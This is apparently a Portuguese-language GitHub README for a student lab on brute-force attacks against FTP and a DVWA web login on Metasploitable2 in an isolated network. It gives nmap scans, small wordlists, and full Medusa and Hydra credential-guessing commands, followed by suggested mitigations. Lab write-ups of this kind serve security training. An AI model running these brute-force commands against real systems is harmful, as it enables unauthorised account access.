# Projeto Medusa Kali Linux — Laboratório de Ataques de Força Bruta


## ❗ Aviso Legal ❗

Todos os testes descritos neste projeto foram realizados **somente em ambiente controlado** (Kali Linux + Metasploitable2/DVWA). Não tente executar esses comandos em sistemas sem autorização.

---

## 🎯 Objetivo do  repositório?

Simular ataques de força bruta em serviços comuns (FTP, SMB e formulários web) utilizando **Kali Linux**, **Medusa** e **Hydra**, documentando os testes e propondo medidas de mitigação.

---

## Ambiente de Teste

* **VM Atacante:** Kali Linux
* **VM Alvo:** Metasploitable2 / DVWA
* **IP da VM alvo:** `192.168.56.101`
* **Rede:** Host-Only/Internal Network
* **Estrutura de pastas do projeto:**


---

## Ferramentas

* Kali Linux
* Medusa (ftp, smbnt)
* Hydra (formulário web)
* Nmap


---
## TESTE DE CONEXÃO

Para verificar a conectividade entre as duas máquinas virtuais, utilize o comando ``ping`` para enviar pacotes ICMP e confirmar se os hosts conseguem se comunicar.`` ping -c 3 [IP do Metasploitable2]``

Exemplo:

``` bash
ping -c 3 192.168.56.101
```


<img width="1056" height="633" alt="pingdamaquina" src="https://github.com/user-attachments/assets/9652c021-ca3f-4428-897c-6864dc6386e2" />


---


## 📡 Reconhecimento das portas com Nmap
O primeiro passo no processo de varredura é executar o ``nmap``, que nos permitirá identificar serviços ativos e portas abertas. nmap [endereço_ip_do_metasploitable2]


``` bash
nmap 192.168.56.101
```



🔽 Saída esperada:


<img width="772" height="764" alt="nmapcmand" src="https://github.com/user-attachments/assets/3f833af3-5710-4883-938d-996c958ec110" />


Vamos focar nas portas 21, 22, 80, 445 e 139 com o comando:


``` bash
nmap -sV -p 21,22,80,445,139 192.168.56.101
```



<img width="901" height="594" alt="nmapsaida" src="https://github.com/user-attachments/assets/c6fc742d-7330-4f58-b422-8c7ffbd7a67e" />



---




## Ataque de força bruta no serviço FTP


Durante a análise, observamos que a porta 21/TCP está ativa, indicando a presença de um serviço FTP (File Transfer Protocol).
Esse protocolo é utilizado para movimentação de arquivos entre sistemas e pode ser alvo de ataques de força bruta, caso não esteja devidamente protegido.



A identificação da porta foi feita por meio do Nmap:



<img width="901" height="345" alt="verificandonmap" src="https://github.com/user-attachments/assets/eba9677b-70e4-446a-8820-a826d52a6632" />




## Wordlists



Nesta fase, foram elaboradas duas wordlists: uma contendo nomes de usuários e outra com senhas prováveis.
Os comandos utilizados foram:



Lista de usuários:

``` bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt`
```

Lista de senhas:


``` bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```



---



## 2) Ataque FTP (Medusa)


Nesta fase do teste, utilizaremos o Medusa, uma ferramenta de brute force, para tentar descobrir credenciais válidas do serviço FTP. Para isso, usaremos as listas de usuários e senhas que criamos anteriormente.

``` bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```
Exemplo: 

<img width="733" height="821" alt="medusacod" src="https://github.com/user-attachments/assets/5af1314b-db4c-452b-a913-75f4fbd72e80" />



## Acessando o serviço FTP com as credenciais encontradas


<img width="1117" height="765" alt="acessoamaquina" src="https://github.com/user-attachments/assets/4b076eeb-7fcd-49fe-9301-057f830bdf98" />




---

## 4) Brute Force em Formulário Web (DVWA) — Hydra

```bash
hydra -l admin -P wordlists/passwords.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Incorrect"
```

* Ajuste `F=Incorrect` conforme mensagem de erro do DVWA.
* Evidência: reports + screenshot `images/04_hydra_dvwa.png`

---

## 5) Evidências

* Logs: `/reports/` (usar `-O` ou `tee`)
* Capturas de tela: `/images/` com prefixos numéricos para organização
* Scripts de automação: `/scripts/`

---

## 6) Mitigações Recomendadas

**FTP:**

* Bloquear login anônimo
* Políticas de senha forte e bloqueio após N tentativas

**SMB:**

* Desabilitar SMBv1
* Logging e alertas para múltiplas tentativas
* MFA e políticas de senha

**Aplicações Web:**

* Proteção contra brute force (rate limiting, captcha, lockout)
* HTTPS e headers de segurança
* Validação e sanitização de entradas

---

## 7) Checklist de entrega

* [ ] Vídeo-aulas assistidas
* [ ] Snapshots das VMs
* [ ] Enumeração (Nmap) salva
* [ ] Ataques realizados (FTP, SMB, DVWA)
* [ ] Capturas de tela em `/images`
* [ ] README.md revisado
* [ ] Repositório GitHub criado e link pronto

---

